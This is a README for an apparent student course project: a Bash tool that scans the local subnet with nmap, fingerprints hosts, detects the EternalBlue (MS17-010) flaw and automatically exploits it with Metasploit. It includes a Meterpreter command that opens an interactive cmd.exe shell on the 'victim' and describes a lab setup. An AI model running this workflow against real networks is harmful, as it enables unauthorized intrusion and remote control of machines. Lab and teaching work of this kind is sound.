# COSC-3411: Alpha

# Network Reachability and Port Scanner — Alpha Team

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [Installation Steps](#installation-steps)
  - [1. Install required packages (Kali usually has them)](#1-install-required-packages-kali-usually-has-them)
  - [2. Download the project](#2-download-the-project)
  - [3. Move into the project folder](#3-move-into-the-project-folder)
  - [4. Move into the Scanner folder](#4-move-into-the-scanner-folder)
  - [5. Make sure the script is executable](#5-make-sure-the-script-is-executable)
  - [6. Run the tool (with root privileges)](#6-run-the-tool-with-root-privileges)
  - [7. Start an interactive CMD session on the victim (only if EternalBlue is found)](#7-start-an-interactive-cmd-session-on-the-victim-only-if-eternalblue-is-found)
- [Usage Example (What you will see)](#usage-example-what-you-will-see)
- [Requirements for Testing](#requirements-for-testing)

<br>

## Overview
This project is a Bash script that automatically scans the local network, detects active devices, checks which ports are open, and tries to identify the operating system running on each host. It also performs an automated EternalBlue (MS17-010) exploitation using the Metasploit Framework against a vulnerable Windows target.
<br><br>
## Features
- Automatically detects the local IP and calculates the /24 subnet
- Scans all devices on the network using nmap
- Identifies live hosts
- Performs OS detection
- Lists top 100 open TCP ports
- Detects EternalBlue vulnerability on port 445
- Automatically launches Metasploit and exploits EternalBlue
<br><br>
## Installation Steps
**1. Install required packages (Kali usually has them):**
```bash
sudo apt install -y nmap metasploit-framework
```
<br>

**2. Download the project:**
```bash
git clone https://github.com/s4m520/COSC-3411-Alpha.git
```

<br>

**3. Move into the project folder:**
```bash
cd COSC-3411-Alpha
ls
```
Inside, you should see:
```bash
README.md  Scanner
```

<br>

**4. Move into the Scanner folder:**
```bash
cd Scanner
```
Inside, you should see:
```bash
scanner.sh
```

<br>

**5. Make sure the script is executable:**
```bash
chmod +x scanner.sh
```

<br>

**6. Run the tool (with root privileges):**
```bash
sudo ./scanner.sh
```

<br>

**7. Start an interactive CMD session on the victim (only if EternalBlue is found)**
```bash
execute -f cmd.exe -H -c -i
```
<br>

## Usage Example (What you will see):
```bash
Scanning Devices Connected to: 192.168.1.0/24

Device          | Operating System         | Open Ports
-------------------------------------------------------------
192.168.1.10    | Windows 7 SP1            | ports: 135 139 445
192.168.1.15    | unknown                  | ports: none-shown
192.168.1.21    | Linux Kernel 5.x         | ports: 22 80

[!] 192.168.1.10: MS17-010 / EternalBlue detected

Exploiting 192.168.1.10 ...
Launching Metasploit...

```
<br>

## Requirements for Testing:
- A vulnerable Windows virtual machine
- Firewall disabled on the Windows VM
- A vulnerable EternalBlue service on port 445
- Attacker machine must be Kali Linux
- Both machines must be on the same network
- Turn on the Windows OS BEFORE starting the scan

**The Windows VM that I used for testing:**
https://archive.org/details/Windows_Server_2008_R2_x64.iso_reupload
